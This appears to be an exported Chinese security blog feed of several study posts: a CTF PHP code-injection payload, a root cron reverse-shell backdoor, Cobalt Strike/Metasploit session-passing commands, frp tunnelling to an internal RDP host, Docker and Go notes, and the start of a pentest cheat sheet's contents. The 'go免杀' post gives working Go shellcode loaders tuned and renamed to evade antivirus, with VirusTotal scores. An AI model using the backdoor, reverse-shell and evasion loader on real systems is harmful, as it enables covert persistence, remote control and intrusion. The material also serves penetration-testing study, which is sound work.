<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create_function(&#39;$a,$b&#39;,&#39;return 111;&#125;phpinfo();&#x2F;&#x2F;&#39;)</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&gt;</span><br><span class="line"></span><br><span class="line">function a($a, $b)&#123;</span><br><span class="line">    return 111;&#125;phpinfo();&#x2F;&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload:?action=\CREATE_FUNCTION&amp;arg=return 2333;}phpinfo();//<br><img src="image-20210811113825153.png" alt="image-20210811113825153"></p>
<p>后面看flag的方法也是学到了需多<br>有<br>print_r(scandir(‘../‘))<br>print_r(file_get_contents(‘../flag_h0w2execute_arb1trary_c0de’))</p>
<p>var_dump(glob(‘./../*’))<br>var_dump(file_get_contents(‘./../flag_h0w2execute_arb1trary_c0de’));</p>
<h2 id="javacon"><a href="#javacon" class="headerlink" title="javacon"></a>javacon</h2><h2 id="lumenserial"><a href="#lumenserial" class="headerlink" title="lumenserial"></a>lumenserial</h2><h2 id="nodechr"><a href="#nodechr" class="headerlink" title="nodechr"></a>nodechr</h2><h2 id="pcrewaf"><a href="#pcrewaf" class="headerlink" title="pcrewaf"></a>pcrewaf</h2><h2 id="phplimit"><a href="#phplimit" class="headerlink" title="phplimit"></a>phplimit</h2><h2 id="phpmagic"><a href="#phpmagic" class="headerlink" title="phpmagic"></a>phpmagic</h2><h2 id="picklecode"><a href="#picklecode" class="headerlink" title="picklecode"></a>picklecode</h2><h2 id="thejs"><a href="#thejs" class="headerlink" title="thejs"></a>thejs</h2><h1 id="2020"><a href="#2020" class="headerlink" title="2020"></a>2020</h1>]]></content>
  </entry>
  <entry>
    <title>cron计划任务后门</title>
    <url>/2022/07/04/cron%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%90%8E%E9%97%A8-This-is-Y/</url>
    <content><![CDATA[<p>在学习vulfocus的aira2文件写入时用到的，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">*&#x2F;1 * * * * root &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>保存到/etc/cron.d/下</p>
]]></content>
  </entry>
  <entry>
    <title>cs、msf相互派生</title>
    <url>/2021/07/07/cs%E3%80%81msf%E7%9B%B8%E4%BA%92%E6%B4%BE%E7%94%9F-This-is-Y/</url>
    <content><![CDATA[<h2 id="MSF下的会话传给CS"><a href="#MSF下的会话传给CS" class="headerlink" title="MSF下的会话传给CS"></a>MSF下的会话传给CS</h2><p>msf使用注入模块 + cs创建Listener监听 （相同payload）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set DisablePayloadHandler true</span><br><span class="line">set lhost (cs listener ip)</span><br><span class="line">set lport (cs listener port)</span><br><span class="line">set session (id)</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>


<h2 id="CS下的会话传给MSF"><a href="#CS下的会话传给MSF" class="headerlink" title="CS下的会话传给MSF"></a>CS下的会话传给MSF</h2><p>使用msf监听模块，ip就是kali的ip，端口就是监听的端口，payload要和cs需要派生的会话相同，然后运行，开始监听</p>
<p>cs创建一个listener，payload为Foreign HTTP，ip也是kali的ip端口和kali监听端口一样<br>右击要传的会话，点击Spawn，选择foregin http那个listense<br>等它执行完命令，msf就会出现一个meterpreter</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http  </span><br><span class="line">set lhost (cs listener ip)</span><br><span class="line">   set lport (cs listener port)</span><br><span class="line">   </span><br><span class="line">   run</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>docker学习笔记</title>
    <url>/2020/08/04/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13430934.html">源地址：https://www.cnblogs.com/This-is-Y/p/13430934.html<i class="fas fa-external-link-alt"></i></a></p>
<p>要看iwebsec直接拉到后面</p>
<p> </p>
<p>服务器用的Ubuntu</p>
<p>一键安装：apt install docker.io</p>
<p>我是因为一个叫FuzzScanner的东西才想起来要学docker的</p>
<p>github地址：<a class="link" href="https://github.com/TideSec/FuzzScanner">https://github.com/TideSec/FuzzScanner<i class="fas fa-external-link-alt"></i></a></p>
<p>这里我拉取了一个镜像：docker pull registry.cn-hangzhou.aliyuncs.com/secplus/tide-fuzzscanner:1.0</p>
<p>启动docker服务：service docker start</p>
<p>查看所有镜像：docker images</p>
<p>查看所有容器：docker ps</p>
<p>查看所有已关闭的容器：docker ps -a</p>
<p>　　（docker的镜像与容器就像是类与对象的关系，容器是镜像的一个实例）</p>
<p>停止一个容器：docker stop 容器ID或名称</p>
<p>　　（停止一个容器并不是删除）</p>
<p>删除一个容器：docker rm -f 容器ID或名称</p>
<p>启动一个容器：docker run -it 容器 /bin/bash</p>
<p>　　参数说明</p>
<ul>
<li><strong>-i：</strong>交互式操作。</li>
<li><strong>-t：</strong>终端。</li>
<li><strong>-d：</strong>在后台运行，不进入容器</li>
<li><strong>/bin/bash</strong>：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 /bin/bash。</li>
<li><strong>–name 名字：</strong>为容器自定义名字，不加这个参数，名字是随机的</li>
</ul>
<p>退出：exit</p>
<p>（值得注意的是，此时直接用exit退出，会导致容器停止，如果只是像单纯的退出命令行界面，保留该docker容器，应该用ctrl+p）</p>
<p>进入一个容器</p>
<li>
**docker attach 容器名称：**用exit退出会导致容器停止**<br>**



</li>
<li>
**docker exec <strong>容器名称：**</strong>用exit退出**不**会导致容器停止



</li>




<p> </p>
<p>docker容器内部文件导出：docker cp 容器ID:文件位置 导出文件位置</p>
<p>　　for example：docker cp 822c9fc1c499:/var/wwwml/api/ /api</p>
<p>　　从ID为822c9fc1c499的容器中的/var/wwwml/api/的文件复制到 主机/api下</p>
<p> </p>
<p><strong>导出容器</strong></p>
<p>docker export 1e560fca3906 &gt; ubuntu.tar</p>
<p>导出容器 1e560fca3906 快照到本地文件  ubuntu.tar</p>
<p><strong>导入容器</strong></p>
<p>cat docker/ubuntu.tar | docker import - test/ubuntu:v1</p>
<p>将快照文件 ubuntu.tar 导入到镜像 test/ubuntu:v1</p>
<p> </p>
<p>docker运行一个WEB应用：docker run -d -p 50050:50050 iwebsec/iwebsec<br>　　-p 指定一个端口（如果这个容器有多个端口，指定端口操作就需要更多的操作）</p>
<p> 查看容器端口情况：docker port 容器名</p>
<img src="1503868-20200804192959122-914225292.png" alt loading="lazy">

<p> </p>
<p> 这是我配置的iwebsec容器，他的80端口映射到了32783端口上。，我要访问这个80端口，就应该访问服务器ip:32783，同时在服务器控制台安全组打开这些端口</p>
<p> </p>
<p> </p>
<p> </p>
<p>2021.1.10</p>
<p>半年后回过头来看，发现自己写了一坨屎在这里👆👆👆👆（上面的东西，md绝了）</p>
<p>iebsec安装：</p>
<p>下载：docker pull iwebsec/iwebsec</p>
<p>启动：docker run -d -p 32104:8088 -p 32105:8080 -p 32106:8000 -p 32107:7001 -p 32108:4379 -p 32109:3306 -p 32110:80 -p 32103:22 iwebsec/iwebsec</p>
<p>这一大串的-p是配置端口，毕竟在云服务器上，80什么的还是有其他的作用，可不能被占了。</p>
<p>查看这个容器端口使用情况　　</p>
<img src="1503868-20210110233812270-1789442850.png" width="1000" loading="lazy">

<p> </p>
<p> 建议端口连起来，这样子在云服务器控制台那边好配置安全组</p>
<img src="1503868-20210110233927819-1466256143.png" width="1000" loading="lazy">

<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>frp配置，连接内网机器3389</title>
    <url>/2021/07/07/frp%E9%85%8D%E7%BD%AE%EF%BC%8C%E8%BF%9E%E6%8E%A5%E5%86%85%E7%BD%91%E6%9C%BA%E5%99%A83389-This-is-Y/</url>
    <content><![CDATA[<p>朋友介绍用frp作内网穿透，正好学习一下如何使用</p>
<p>下载地址：<a class="link" href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases<i class="fas fa-external-link-alt"></i></a><br>下载过来，frpc是客户端文件，frps是服务端文件。<br>环境：win10（主机：192.168.247.1），win7（靶机边界：192.168.247.136/192.168.52.141），win2008R2（内网机器：192.168.52.138）<br>现在要完成的目标是win10使用3389连接到win2003</p>
<p>win10运行服务端，可以直接命令行 frps.exe运行，不修改配置文件（前提是端口没有被占用）<br>把frpc对应的几个文件上传到win7中，修改配置文件frpc.ini中的server_addr = 192.168.247.1.可以先测试一下能不能win7win10能不能连接</p>
<p><img src="image-20210707220634877.png" alt="image-20210707220634877"></p>
<p>这样就可以成功在 FRP 服务端上成功建立一个客户端连接，当然现在还并不能对外提供任何内网机器上的服务，因为我们并还没有在 FRP 服务端注册任何内网服务的端口</p>
<p>接下来断开连接，</p>
<p>修改客户端配置文件如下</p>
<p><img src="image-20210707220334506.png" alt="image-20210707220334506"></p>
<p>这样就在 FRP 服务端上成功注册了一个端口为 6000 的服务，接下来我们就可以通过这个端口访问内网机器上3389 服务.这时候我win10上想要连接到win2008的3389时，就可以通过192.168.247.1:6000访问到192.168.52.138:3389</p>
<p><img src="image-20210707221114793.png" alt="image-20210707221114793"></p>
<p><img src="image-20210707221042105.png" alt="image-20210707221042105"></p>
]]></content>
  </entry>
  <entry>
    <title>go笔记</title>
    <url>/2021/03/06/go%E7%AC%94%E8%AE%B0-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14492860.html">源地址：https://www.cnblogs.com/This-is-Y/p/14492860.html<i class="fas fa-external-link-alt"></i></a></p>
<p>学习网站：<a class="link" href="https://studygolang.gitbook.io/learn-go-with-tests/go-ji-chu/hello-world#bian-xie-ce-shi">https://studygolang.gitbook.io/learn-go-with-tests/go-ji-chu/hello-world#bian-xie-ce-shi<i class="fas fa-external-link-alt"></i></a></p>
<p>编写测试</p>
<p>编写测试和函数很类似，其中有一些规则</p>
<p> </p>
<li>

<p>程序需要在一个名为 <code>xxx_test.go</code> 的文件中编写</p>
</li>
<li>

<p>测试函数的命名必须以单词 <code>Test</code> 开始</p>
</li>

<ul>
<li>测试函数只接受一个参数 <code>t *testing.T</code></li>
</ul>
<p>现在这些信息足以让我们明白，类型为 <code>*testing.T</code> 的变量 <code>t</code> 是你在测试框架中的 hook（钩子），所以当你想让测试失败时可以执行 <code>t.Fail()</code> 之类的操作。</p>
<p> </p>
<p><strong><code>t.Errorf</code></strong></p>
<p>我们调用 <code>t</code> 的 <code>Errorf</code> 方法打印一条消息并使测试失败。error后面的<code>f</code> 表示格式化，它允许我们构建一个字符串，并将值插入占位符值 <code>%q</code> 中。当你的测试失败时，它能够让你清楚是什么错误导致的。</p>
<p> </p>
<p> </p>
<p>介绍了一种叫做TDD的程序设计方法论，即测试驱动开发(Test-Driven development)</p>
<p>去查了一下这个东西：<a class="link" href="https://juejin.cn/post/6844903925842198536">https://juejin.cn/post/6844903925842198536<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="TDD三原则"><a href="#TDD三原则" class="headerlink" title="TDD三原则"></a>TDD三原则</h1><ol>
<li>除非为了通过一个单元测试，否则不允许编写任何产品代码。</li>
<li>在一个单元测试中只允许编写刚好能够导致失败的内容。</li>
<li>一次只能写通过一项单元测试的产品代码，不能多写。</li>
</ol>
<blockquote>
<ol>
</ol></blockquote>
<ul>
<li>You are not allowed to write any production code unless it is to make a failing unit test pass.</li>
<li>You are not allowed to write any more of a unit test than is sufficient to fail; and compilation failures are failures.</li>
<li>You are not allowed to write any more production code than is sufficient to pass the one failing unit test.</li>
</ul>
<p> </p>
<p> </p>
<p> </p>
<p>3.6</p>
<p><strong>for循环</strong></p>
<p>go里面没有<code>while</code>，<code>do</code>，<code>until</code> 这几个关键字,</p>
<p>for循环的变体</p>
<p> </p>
<p> 空白标识符可以接收一个不需要用的参数，最常用的地方就是在 使用range 迭代数组时，每次迭代都会返回数组元素的索引和值。我们选择使用 _ 空白标志符 来忽略索引。</p>
<p> </p>
<p> </p>
<p> </p>
<p>3.7</p>
<p><strong>函数</strong></p>
<p>函数可变参数</p>
<p> </p>
<p> </p>
<p>** 方法 reflect.DeepEqual**</p>
<p>这个方法在比较两个数组元素是否完全相同时很好用</p>
<p> 两个数组完全相同返回true，否则返回false</p>
<p> </p>
<p> </p>
<p><strong>方法make</strong></p>
<p>一种创建切片的新方式。make 可以在创建切片的时候指定我们需要的长度和容量。<br>我们可以使用切片的索引访问切片内的元素，使用 = 对切片元素进行赋值。</p>
<p> </p>
<p><strong>切片处理</strong></p>
<p>使用语法 slice[low:high] 获取部分切片，比如</p>
<p> 就可以获取到从第二个到第五个元素，如果在冒号的一侧没有数字就会一直取到最边缘的元素，比如</p>
<p> 就可以获取到从第二个开始到最后的元素</p>
<p> </p>
<p><strong>结构体</strong></p>
<p>go定义结构体和c语言一样，在定义方法时有所区别，不过在调用的时候是一样的</p>
<p> </p>
<p> <strong>接口</strong></p>
<p> <a class="link" href="https://www.zhihu.com/question/318138275">https://www.zhihu.com/question/318138275<i class="fas fa-external-link-alt"></i></a></p>
<p>稍微学习了一下接口的意思，但还是比较模糊。知乎里说到的鸭子模型，只要它能达到我所设置的成为鸭子的条件，那它就是鸭子。</p>
<p> 可以看到在两种手机，两种电脑中，乱入了一台假装自己是手机的电脑，当LapTop定义了这样两个方法后，它即实现了手机这个接口，又实现了电脑这个接口。于是出现了下面的情况</p>
<p> 但是只得注意的是，computer.call()并不能执行，虽然这里的computer本质是LapTop，而LapTop有call()这个方法，但是因为接口的关系，它在这里只能成为computer（好像有点绕）</p>
<p>用蓝皮书上说的，接口就是一种约定</p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>go免杀笔记</title>
    <url>/2022/07/29/go%E5%85%8D%E6%9D%80%E7%AC%94%E8%AE%B0-This-is-Y/</url>
    <content><![CDATA[<p>参考：<br><a class="link" href="https://geektutu.com/post/quick-golang.html">https://geektutu.com/post/quick-golang.html<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://www.freebuf.com/sectool/328982.html">https://www.freebuf.com/sectool/328982.html<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://github.com/awsaaaq/GoBP">https://github.com/awsaaaq/GoBP<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>go读取shellcode，这里用的cs的x64 raw</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">read</span><span class="params">(file <span class="keyword">string</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">	data, _ := ioutil.ReadFile(file)</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	shellcode := read(<span class="string">&quot;./64.bin&quot;</span>)</span><br><span class="line">	fmt.Println(shellcode)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// [252 72 131 228 13 212 67 250 25 171 144 13 92 …………………… 195 232 127 253 255 255 49 55 50 46 50 52 46 49 57 52 46 49 50 49 0 25 105 160 141 160 141]</span></span><br></pre></td></tr></table></figure>

<p>shellcode loader</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;syscall&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">	MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">	PAGE_EXECUTE_READWRITE = <span class="number">0x40</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	kernel32      = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">	ntdll         = syscall.MustLoadDLL(<span class="string">&quot;ntdll.dll&quot;</span>)</span><br><span class="line">	VirtualAlloc  = kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line">	RtlCopyMemory = ntdll.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">read</span><span class="params">(file <span class="keyword">string</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">	data, _ := ioutil.ReadFile(file)</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	shellcode := read(<span class="string">&quot;./64.bin&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// go loader</span></span><br><span class="line">	addr, _, _ := VirtualAlloc.Call(<span class="number">0</span>, <span class="keyword">uintptr</span>(<span class="built_in">len</span>(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line">	_, _, _ = RtlCopyMemory.Call(addr, (<span class="keyword">uintptr</span>)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])), <span class="keyword">uintptr</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">	syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>更多人用的都是下面这样的loader,不过我不知道这两个if判断有什么实用性，就把它们给删了</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="keyword">uintptr</span>(<span class="built_in">len</span>(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">	syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">_, _, err = RtlCopyMemory.Call(addr, (<span class="keyword">uintptr</span>)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])), <span class="keyword">uintptr</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">	syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">time.Sleep(<span class="number">5</span> * time.Second)</span><br><span class="line">syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>



<p>比较意外的是，这样子直接编译，2mb大小，免杀效果还不错<br>编译  </p>
<ul>
<li>go build -ldflags=”-H windowsgui” .\loader.go</li>
</ul>
<p>7/70 <a class="link" href="https://www.virustotal.com/gui/file/4aa8427eb6f6d8bd1308832081fef2012823c6e1dc464361b24babb7eed5fb91?nocache=1">https://www.virustotal.com/gui/file/4aa8427eb6f6d8bd1308832081fef2012823c6e1dc464361b24babb7eed5fb91?nocache=1<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>改了一些变量名</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	some <span class="string">&quot;syscall&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	ZXC = <span class="number">0x1000</span></span><br><span class="line">	VB  = <span class="number">0x2000</span></span><br><span class="line">	NM  = <span class="number">0x40</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	qwer  = <span class="string">&quot;kernel32.dll&quot;</span></span><br><span class="line">	tyui  = <span class="string">&quot;ntdll.dll&quot;</span></span><br><span class="line">	op    = <span class="string">&quot;VirtualAlloc&quot;</span></span><br><span class="line">	asdf  = <span class="string">&quot;RtlCopyMemory&quot;</span></span><br><span class="line">	kl32  = some.MustLoadDLL(qwer)</span><br><span class="line">	ntdll = some.MustLoadDLL(tyui)</span><br><span class="line">	opp   = kl32.MustFindProc(op)</span><br><span class="line">	ghjk  = ntdll.MustFindProc(asdf)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">read</span><span class="params">(file <span class="keyword">string</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">	data, _ := ioutil.ReadFile(file)</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	shellcode := read(<span class="string">&quot;./64.bin&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// go loader</span></span><br><span class="line">	addr, _, _ := opp.Call(<span class="number">0</span>, <span class="keyword">uintptr</span>(<span class="built_in">len</span>(shellcode)), ZXC|VB, NM)</span><br><span class="line"></span><br><span class="line">	_, _, _ = ghjk.Call(addr, (<span class="keyword">uintptr</span>)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])), <span class="keyword">uintptr</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line"></span><br><span class="line">	some.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 17/70 https://www.virustotal.com/gui/file/453e468b4ea8d9fa64a8b18dd5120567fa962393424d3ca69a70c90f2bcbc124?nocache=1</span></span><br></pre></td></tr></table></figure>
<p>不像python那样了，效果反而更差了</p>
]]></content>
  </entry>
  <entry>
    <title>Pentest_Note</title>
    <url>/2021/07/28/Pentest_Note-This-is-Y/</url>
    <content><![CDATA[<p>转载 from:<a class="link" href="https://github.com/xiaoy-sec/Pentest_Note">https://github.com/xiaoy-sec/Pentest_Note<i class="fas fa-external-link-alt"></i></a></p>
<ul>
<li>Author:小y</li>
<li>公众号:关注安全技术<br><img src="wechat.png" alt="image"></li>
</ul>
<h1 id="Pentest-Note"><a href="#Pentest-Note" class="headerlink" title="Pentest_Note"></a>Pentest_Note</h1><h3 id="转载请随意，记得加from"><a href="#转载请随意，记得加from" class="headerlink" title="转载请随意，记得加from"></a>转载请随意，记得加from</h3><h3 id="声明1："><a href="#声明1：" class="headerlink" title="声明1："></a>声明1：</h3><pre><code>依照《中华人民共和国网络安全法》等相关法规规定，任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。
</code></pre>
<h3 id="声明2："><a href="#声明2：" class="headerlink" title="声明2："></a>声明2：</h3><pre><code>以下内容均在本地完成复现，不涉及任何非法行为，不允许使用本项目所提及的所有技术内容进行非法行为，使用技术的风险由使用者自行承担。
</code></pre>
<ul>
<li><p><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></p>
<ul>
<li><a href="#whois">Whois</a></li>
<li><a href="#%E7%BD%91%E7%AB%99ip">网站IP</a><ul>
<li><a href="#%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8cdn">是否存在CDN</a></li>
<li><a href="#bypass-cdn%E5%B8%B8%E8%A7%84%E6%96%B9%E5%BC%8F">Bypass cdn常规方式</a></li>
</ul>
</li>
<li><a href="#%E5%9F%9F%E5%90%8D%E5%8E%86%E5%8F%B2ip">域名历史IP</a></li>
<li><a href="#%E7%BD%91%E7%AB%99%E6%9E%B6%E6%9E%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8C%87%E7%BA%B9cms%E8%AF%86%E5%88%AB%E5%AE%B9%E5%99%A8">网站架构/服务器指纹/CMS识别/容器</a></li>
<li><a href="#%E5%AD%90%E5%9F%9F%E5%90%8D">子域名</a></li>
<li><a href="#%E7%BD%91%E7%AB%99%E4%BD%BF%E7%94%A8%E7%9A%84cms%E7%9A%84%E5%AE%98%E6%96%B9demo%E7%AB%99">网站使用的CMS的官方demo站</a></li>
<li><a href="#ssl%E8%AF%81%E4%B9%A6%E4%BF%A1%E6%81%AF">SSL证书信息</a></li>
<li><a href="#dns%E5%8E%86%E5%8F%B2%E8%A7%A3%E6%9E%90%E8%AE%B0%E5%BD%95">DNS历史解析记录</a></li>
<li><a href="#%E5%90%8C%E6%9C%8D%E7%AB%99%E7%82%B9%E6%83%85%E5%86%B5">同服站点情况</a></li>
<li><a href="#%E5%90%8C%E6%A0%B7%E6%9E%B6%E6%9E%84%E6%88%96%E6%BA%90%E7%A0%81%E7%9A%84%E7%AB%99">同样架构或源码的站</a></li>
<li><a href="#%E7%BD%91%E7%AB%99js">网站js</a></li>
<li><a href="#%E7%BD%91%E7%AB%99%E4%BD%BF%E7%94%A8%E7%9A%84%E7%AC%AC%E4%B8%89%E6%96%B9js">网站使用的第三方js</a></li>
<li><a href="#%E4%BA%91%E4%BF%A1%E6%81%AF">云信息</a></li>
<li><a href="#app%E5%8F%8D%E7%BC%96%E8%AF%91">APP反编译</a></li>
<li><a href="#c%E6%AE%B5b%E6%AE%B5%E4%BF%A1%E6%81%AF">C段/B段信息</a></li>
<li><a href="#%E5%B7%A5%E5%85%B7">工具</a></li>
<li><a href="#%E7%AB%AF%E5%8F%A3%E5%AF%B9%E5%A4%96%E5%BC%80%E6%94%BE%E6%83%85%E5%86%B5">端口对外开放情况</a></li>
<li><a href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E7%88%AC%E8%99%AB%E6%85%8E%E7%94%A8">目录扫描/爬虫(慎用)</a></li>
<li><a href="#waf%E6%83%85%E5%86%B5%E8%AF%86%E5%88%AB">WAF情况识别</a></li>
<li><a href="#%E9%9A%8F%E6%89%8B%E6%B5%8B%E8%AF%95">随手测试</a></li>
<li><a href="#%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E">搜索引擎</a></li>
<li><a href="#shodanfofazoomeye">Shodan/fofa/zoomeye</a></li>
<li><a href="#google-dorks">Google dorks</a></li>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">信息泄露</a></li>
<li><a href="#%E7%BD%91%E9%A1%B5%E7%BC%93%E5%AD%98">网页缓存</a></li>
<li><a href="#%E5%9B%BE%E7%89%87%E5%8F%8D%E6%9F%A5">图片反查</a></li>
<li><a href="#%E7%A4%BE%E4%BA%A4">社交</a></li>
<li><a href="#%E6%89%8B%E6%9C%BA%E5%8F%B7%E5%8A%A0%E5%85%A5%E9%80%9A%E8%AE%AF%E5%BD%95%E5%8C%B9%E9%85%8D%E5%90%84%E4%B8%AAapp%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF">手机号加入通讯录匹配各个APP用户信息</a></li>
<li><a href="#%E6%B3%A8%E5%86%8C%E8%BF%87%E7%9A%84%E7%BD%91%E7%AB%99">注册过的网站</a></li>
<li><a href="#%E7%9B%AE%E6%A0%87%E4%BA%BA%E5%91%98%E7%9A%84%E5%85%B4%E8%B6%A3">目标人员的兴趣</a></li>
<li><a href="#%E9%82%AE%E7%AE%B1%E6%90%9C%E9%9B%86">邮箱搜集</a></li>
<li><a href="#exchange">Exchange</a></li>
<li><a href="#%E9%AA%8C%E8%AF%81%E9%82%AE%E7%AE%B1%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8">验证邮箱是否存在</a></li>
<li><a href="#%E5%8E%86%E5%8F%B2%E6%B3%84%E9%9C%B2%E8%BF%87%E7%9A%84%E8%B5%84%E6%96%99%E7%AD%89">历史泄露过的资料等</a></li>
<li><a href="#githubgitee%E7%AD%89%E4%BB%A3%E7%A0%81%E6%89%98%E7%AE%A1%E5%B9%B3%E5%8F%B0">Github/Gitee等代码托管平台</a></li>
<li><a href="#%E8%A2%AB%E5%85%A5%E4%BE%B5%E7%BD%91%E5%9D%80%E5%88%97%E8%A1%A8">被入侵网址列表</a></li>
<li><a href="#gps%E6%9F%A5%E8%AF%A2">GPS查询</a></li>
